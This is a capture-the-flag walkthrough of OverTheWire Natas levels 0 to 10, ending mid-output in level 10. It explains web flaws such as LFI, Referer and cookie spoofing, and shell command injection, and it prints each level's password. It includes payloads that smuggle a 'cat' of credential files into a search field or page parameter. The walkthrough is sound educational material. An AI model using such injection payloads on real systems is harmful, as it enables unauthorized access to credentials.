# Natas
## Introduction 
The OverTheWire Natas wargame focuses on introducing the fundamentals of server-side web security. It is designed to help learners understand common web vulnerabilities and how they can be exploited through practical, hands-on challenges.

## Structure and Access
Each level in Natas is presented as a standalone web application, accessible via a unique URL following the format:
http://natasX.natas.labs.overthewire.org, where X represents the level number.
Unlike other wargames, Natas does not require SSH access. Instead, users log in through the web interface using the designated username (e.g., natas0 for Level 0) along with the corresponding password.

## Objective
The main objective of each level is to retrieve the password for the next level. This typically involves analyzing the web application, identifying vulnerabilities, and exploiting them to gain access to restricted information.
- Passwords for each level are stored on the server in the directory: `/etc/natas_webpass/`
- For example, the password for natas5 is stored in: `/etc/natas_webpass/natas5`, and can only be accessed by specific permission levels (e.g., natas4 and natas5). This reinforces the concept of access control and privilege separation.

## Getting Started
To begin the challenge:
- Username: natas0
- Password: natas0
- URL: http://natas0.natas.labs.overthewire.org

Learners are encouraged to explore each level carefully, inspect web elements, and apply logical thinking to uncover hidden information. Each challenge builds upon previous knowledge, gradually strengthening understanding of web security concepts.

<br><br><br><br><br>






## Natas 0
```
URL: http://natas0.natas.labs.overthewire.org
Username: natas0
Password: natas0
```
After login, the following note is displayed: 
```
You can find the password for the next level on this page.
```

### Approach
After logging into the web application, the page does not visibly display any useful information.  
To investigate further, the page source code was examined using:
- Right-click → **View Page Source**, or  
- Browser Developer Tools (**Inspect**)

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
</div>
</body>
</html>
```

### Finding 
In the `<div></div>` content, the password is discovered, which is `<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->`

### Analysis
This level demonstrates a basic information disclosure vulnerability, where sensitive data is exposed within the client-side source code.
Although comments are not rendered in the browser, they are still accessible to users who inspect the page. Storing credentials in HTML comments is considered a poor security practice, as it allows attackers to easily retrieve hidden information.

Thus, it is important to note that HTML comments are not secure and should not be used to hide critical data. Always inspect page source when analyzing web applications and never store sensitive information (e.g., passwords) in client-side code.


<br><br><br><br><br>






## Natas 1
```
URL: http://natas1.natas.labs.overthewire.org
Username: natas1
Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
```
After login, the following note is displayed: 
```
You can find the password for the next level on this page, but rightclicking has been blocked!
```

### Approach 
Upon accessing the webpage, it was observed that right-click functionality was disabled, preventing the use of standard options such as **“View Page Source”** or **“Inspect”**.
To bypass this restriction, alternative methods were used:
- Press **F12** to open Developer Tools  
- Press **CTRL + U** to directly view the page source  
These shortcuts are browser-level features and cannot be disabled by client-side scripts.

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas1", "pass": "0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
</div>
</body>
</html>
```

### Finding 
After viewing the page source, a similar pattern to the previous level was identified. The password for the next level was found embedded within an HTML comment inside the `<div>` element, which is `<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->`

### Analysis
This level demonstrates that client-side restrictions, such as disabling right-click, do not provide real security. Such controls can be easily bypassed using built-in browser shortcuts or developer tools. Additionally, the application continues to expose sensitive information through HTML comments, reinforcing the concept of **information disclosure vulnerabilities** in client-side code. It is important to understand that restricting user interactions via JavaScript does not prevent access to underlying source code. Sensitive data should never be stored on the client side, regardless of any interface restrictions imposed.

<br><br><br><br><br>






## Natas 2
```
URL: http://natas2.natas.labs.overthewire.org
Username: natas2
Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
```
After login, the following note `There is nothing on this page` is displayed.

### Approach 
The page did not display any obvious information related to the next level.  
To investigate further, the page source was accessed using: **CTRL + U**

Below is the content of the page source: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas2", "pass": "TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI" };</script></head>
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body></html>
```

Within the source code, the line `<img src="files/pixel.png">` was identified. This indicated the existence of a directory named `/files/`. 

By navigating to: `http://natas2.natas.labs.overthewire.org/files/`, a directory listing was revealed.

### Finding 
The `/files/` directory contains `pixel.png` and `users.txt`

Upon accessing users.txt, the following credentials were found:
```txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```
The password for natas3 was successfully obtained.

### Analysis
This level demonstrates a common directory listing vulnerability, where sensitive files are exposed due to improper server configuration. The presence of the `/files/` directory, combined with directory indexing enabled, allowed unauthorized users to browse and access internal files. The `users.txt` file contained plaintext credentials, leading directly to the next level.

This highlights the importance of securing server directories by disabling directory listing and restricting access to sensitive files. Additionally, storing credentials in plaintext within accessible directories is a critical security flaw that should always be avoided.


<br><br><br><br><br>






## Natas 3
```
URL: http://natas3.natas.labs.overthewire.org
Username: natas3
Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```
After login, the following note `There is nothing on this page` is displayed.

### Approach 
Below is the initial inspection of the webpage and its source code (**CTRL + U**): 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas3", "pass": "3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" };</script></head>
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```
but did not reveal any useful information.

As an alternative approach, common hidden paths were explored. The file `robots.txt` was accessed via `http://natas3.natas.labs.overthewire.org/robots.txt`. This file is typically used to instruct search engines on which directories should not be indexed.

### Finding 
The `robots.txt` file contained the following entry:
```txt
User-agent: *
Disallow: /s3cr3t/
```

This revealed a hidden directory: `/s3cr3t/`. Navigating to the directory: `http://natas3.natas.labs.overthewire.org/s3cr3t/`. A file named `users.txt` was discovered. Accessing it revealed:
```txt
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```
The password for **natas4** was successfully obtained.

### Analysis
This level demonstrates improper handling of sensitive directories through the use of `robots.txt`. While this file is intended to guide search engine crawlers, it does not enforce access restrictions and is publicly accessible to anyone.

By listing `/s3cr3t/` in `robots.txt`, the application unintentionally exposed the location of a sensitive directory. Since no additional access controls were implemented, it was possible to directly navigate to the directory and retrieve confidential information.

This highlights that `robots.txt` should not be relied upon as a security mechanism. Sensitive resources must be properly secured using authentication and authorization controls, rather than simply being hidden from search engines.


<br><br><br><br><br>






## Natas 4
```
URL: http://natas4.natas.labs.overthewire.org
Username: natas4
Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```
After login, the following note is displayed: `Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`

After clicking `Refresh page`, we are navigating to `http://natas4.natas.labs.overthewire.org/index.php` and the following note is displayed: `Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`

After clicking the `Refresh page` again, we are navigating to the same page `http://natas4.natas.labs.overthewire.org/index.php`, and the following note is displayed: `Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`

### Approach 
This suggests that the server is validating the **HTTP Referer header** to control access. To bypass this restriction, configure the proxy setting and turn on the intercept of the burpsuite. Then, the content below is captured through HTTP history: 
```
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
Connection: keep-alive
Referer: http://natas4.natas.labs.overthewire.org/index.php
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1
```

Next, send the captured request to repeater and modify the referer from `Referer: http://natas4.natas.labs.overthewire.org/index.php` to `Referer: http://natas5.natas.labs.overthewire.org/`. Then send the request. 

### Finding 
After that, you will obtain the response below: 
```html
HTTP/1.1 200 OK
Date: Sat, 11 Apr 2026 14:36:22 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 962
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```
Then, the password for natas5 is successfully obtained.

### Analysis
This level demonstrates a Referer header-based access control vulnerability. The application relies on the client-supplied Referer header to determine whether a request is authorized.

Since HTTP headers can be easily modified by an attacker using tools like Burp Suite, this form of access control is inherently insecure. The server does not perform proper validation or authentication, allowing attackers to spoof the expected request origin.

This highlights that client-controlled data, such as HTTP headers, should never be trusted for enforcing security mechanisms. Proper access control should be implemented server-side using robust authentication and authorization techniques.

<br><br><br><br><br>







## Natas 5
```
URL: http://natas5.natas.labs.overthewire.org
Username: natas5
Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```
After login, the following note is displayed: `Access disallowed. You are not logged in`

### Approach 
To do the investigation, the burpsuite is used and the intercept is turned on. Then, refresh the page again and get the request and forward it. Then, request and response below is collected from http history. 

#### Content of the request: 
```html
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; loggedin=0
Upgrade-Insecure-Requests: 1
```

#### Content of the response
```html
HTTP/1.1 200 OK
Date: Sat, 11 Apr 2026 14:57:37 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: loggedin=0
Vary: Accept-Encoding
Content-Length: 855
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access disallowed. You are not logged in</div>
</body>
</html>
```

Through observation, it was identified that the application uses a cookie parameter (`loggedin`) to manage authentication state.

Next, the request is sent to the repeater and the loggedin parameter in cookie is modified from 
```
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; loggedin=0
```
to 
```
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; loggedin=1
```
The modified request was then resent to the server.


### Finding 
After sending the request, the following response is returned: 
```html
HTTP/1.1 200 OK
Date: Sat, 11 Apr 2026 15:03:55 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: loggedin=1
Vary: Accept-Encoding
Content-Length: 890
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
</body>
</html>
```

### Analysis
This level demonstrates a cookie-based authentication vulnerability, where the application relies on client-side data to determine whether a user is authenticated.

Since cookies are stored and controlled by the client, they can be easily modified using tools like Burp Suite. By simply changing the loggedin value from 0 to 1, it was possible to bypass authentication without valid credentials.

This highlights a critical security flaw: client-side data should never be trusted for authentication or authorization decisions. Proper session management must be enforced on the server side, where session states are securely validated and cannot be manipulated by the user.


<br><br><br><br><br>







## Natas 6
```
URL: http://natas6.natas.labs.overthewire.org
Username: natas6
Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```
After logging in, the webpage displayed an input field labeled **“Input secret”**, along with a submit button. Initial testing with arbitrary values such as `aaa` and `bbb` returned the response: `Wrong secret`.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding
By reviewing the source code, it was observed that the server-side PHP implementation includes "includes/secret.inc“.

### Approach 
Further investigation was performed by navigating to ·http://natas6.natas.labs.overthewire.org/includes/secret.inc·, where the following content was obtained.
```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

The value `FOEIUWGHFEEUHOFUOIU` was then tested as the input secret and submitted. The following response was returned:
```
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

### Analysis
This level demonstrates a **poor server-side security practice**, where sensitive information is stored in an accessible file within the web directory structure.

Although the secret value is not directly shown in the main application, it can still be retrieved by directly accessing the included file due to improper access control. This exposes a **path disclosure and information leakage vulnerability**.

Sensitive data such as secrets, credentials, or configuration values should never be stored in publicly accessible web directories. Additionally, server-side files should be properly protected to prevent direct access.


<br><br><br><br><br>







## Natas 7
```
URL: http://natas7.natas.labs.overthewire.org
Username: natas7
Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```
After login, two navigation links were observed: `Home` and `About`.
After clicked the `Home`, the page navigate to `http://natas7.natas.labs.overthewire.org/index.php?page=home` and displaying `this is the front page`.
After clicked the `About`, the page navigate to `http://natas7.natas.labs.overthewire.org/index.php?page=about` and displaying `this is the about page`. 

This indicates that the application dynamically loads content based on the `page` parameter in the URL.

### Finding 
Upon inspecting the page source, the following content is discovered:
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the about page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

The comment `<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->` suggests that the application may allow access to local files. 


### Approach
Initial attempt to navigate to `http://natas7.natas.labs.overthewire.org/index.php?page=etc/natas_webpass/natas8` is made and following content is returned: 
```
Warning: include(etc/natas_webpass/natas8): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21

Warning: include(): Failed opening 'etc/natas_webpass/natas8' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21
```
This resulted in an error, indicating the file could not be found.  

A second attempt using an absolute path `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`successfully returned the password: `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`.


### Analysis
This level demonstrates a **Local File Inclusion (LFI) vulnerability**, where user input is directly used to include files on the server without proper validation.

By manipulating the `page` parameter, it was possible to access sensitive files outside the intended directory. The application failed to sanitize or restrict input paths, allowing traversal to critical system files such as `/etc/natas_webpass/natas8`.

This highlights the importance of validating and restricting user input in file inclusion mechanisms. Applications should enforce strict whitelisting of allowed files and avoid directly including user-controlled input to prevent unauthorized access to sensitive data.


<br><br><br><br><br>







## Natas 8
```
URL: http://natas8.natas.labs.overthewire.org
Username: natas8
Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```
After login, the webpage displayed an input field labeled **“Input secret”**, along with a submit button. Initial testing with arbitrary values such as `aaa` and `bbb` returned the response: `Wrong secret`.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas8", "pass": "<censored>" };</script></head>
<body>
<h1>natas8</h1>
<div id="content">

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
The source code revealed the following implementation:
```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

This indicates that the input is transformed using the following sequence:
1. Base64 encoding  
2. String reversal  
3. Conversion to hexadecimal  


### Approach 
To discover the original input, the cyberchef (https://gchq.github.io/CyberChef/) is used. 
The recipe will be reverse step of the encryption, perform the following operation: 
1. Encrypted Answer as Input: `3d3d516343746d4d6d6c315669563362`
2. From Hex: `==QcCtmMml1ViV3b`
3. Reverse: `b3ViV1lmMmtCcQ==`
4. From Base64: `oubWYf2kBq` and obtain the answer. 

Then, input the answer `oubWYf2kBq` into the input field and submit. Then the the message `Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t` is returned. 


### Analysis
This level demonstrates a **weak encoding-based security mechanism**, where sensitive validation relies on reversible transformations rather than secure hashing.

Since the encoding process (Base64, reverse, hex) is fully reversible, an attacker can easily derive the original secret by applying the inverse operations. Tools like CyberChef simplify this process, making such protections ineffective.

This highlights that encoding should not be used as a security control. Sensitive values should instead be protected using strong, one-way hashing algorithms and proper server-side validation mechanisms.


<br><br><br><br><br>







## Natas 9
```
URL: http://natas9.natas.labs.overthewire.org
Username: natas9
Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```
After login, the webpage displayed an input field labeled **“Find words containing:”**, along with a search button. Initial testing with sample value such as `aa`: 
```
Output:
aardvark
aardvark's
bazaar
bazaar's
bazaars
```
returned matching results from a dictionary file, indicating that the application performs a search operation.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


### Finding  
The source code revealed the following implementation:
```php
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```
This shows that user input ($key) is directly passed into a system command without any sanitization.


### Approach 
By supplying the payload: `; cat /etc/natas_webpass/natas10;`, the executed command become 
`grep -i ; cat /etc/natas_webpass/natas10; dictionary.txt`. After clicking the submit button, the message `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu` is returned. 

### Analysis
This level demonstrates a command injection vulnerability, where user input is directly executed as part of a system command.

The original command:
```bash
grep -i <input> dictionary.txt
```
is intended to search for matching words. However, since the input is not sanitized, it is possible to inject additional commands using shell metacharacters such as ;.

In this case:
- `;` = **command separator**. It tells the shell: “run another command” and is used to terminate the original command
- cat /etc/natas_webpass/natas10 is injected to read a sensitive file
- The final ; ensures proper command separation

As result, this becomes **3 commands**:
1. `grep -i`  
   → incomplete, does nothing useful

2. `cat /etc/natas_webpass/natas10`  
   → THIS is the important one (reads password file)

3. `dictionary.txt`  
   → treated as a command (ignored / error)

As a result, the system executes multiple commands instead of just the intended grep operation. This highlights the importance of properly sanitizing user input and avoiding direct execution of user-controlled data in system commands. Secure alternatives include input validation, escaping special characters, or using safer APIs that do not invoke the shell.


<br><br><br><br><br>







## Natas 10
```
URL: http://natas10.natas.labs.overthewire.org
Username: natas10
Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```
After login, the webpage displayed a message `For security reasons, we now filter on certain characters` and an input field labeled **“Find words containing:”**, along with a search button. Initial testing with sample value such as `aa`: 
```
Output:
aardvark
aardvark's
bazaar
bazaar's
bazaars
```
returned matching results from a dictionary file, indicating that the application performs a search operation.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


### Finding 
The source code revealed the following logic:
```php
if(preg_match('/[;|&]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
```
This shows that the application attempts to prevent command injection by filtering the characters:`;`, `|` and `&`. However, user input is still directly passed into the system command.


### Approach 
By supplying the payload `a /etc/natas_webpass/natas11` as the input and click the submit button. The following content is returned: 
```
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
dictionary.txt:Americanism
dictionary.txt:Americanism's
dictionary.txt:Americanisms
dictionary.txt:Americans
dictionary.txt:April
dictionary.txt:April's
dictionary.txt:Aprils
dictionary.txt:Asian
dictionary.txt:Asians
dictionary.txt:August
dictionary.txt:August's
dictionary.txt:Augusts
dictionary.txt:Catholic
dictionary.txt:Catholicism
dictionary.txt:Catholicism's
dictionary.txt:Catholicisms
dictionary.txt:Catholics
